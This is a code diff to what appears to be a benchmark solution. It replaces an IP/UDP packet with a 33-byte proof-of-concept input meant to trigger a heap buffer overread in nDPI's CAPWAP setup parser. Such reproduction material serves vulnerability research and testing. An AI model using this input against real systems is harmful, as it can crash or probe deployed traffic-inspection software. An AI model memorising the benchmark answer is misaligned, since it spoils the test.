@@ -1,6 +1,7 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        ip_header = b'\x45\x00\x00\x21\x00\x00\x40\x00\x40\x11\x3a\xcd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-        udp_header = b'\x14\x7e\x14\x7e\x00\x0d\x00\x00'
-        payload = b'\x10\x02\x00\x00\x00'
-        return ip_header + udp_header + payload
+        # Crafted PoC for heap buffer overread in ndpi_search_setup_capwap
+        # CAPWAP setup message with insufficient binding length to trigger overread
+        poc = b'\x80\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'
+        assert len(poc) == 33
+        return poc
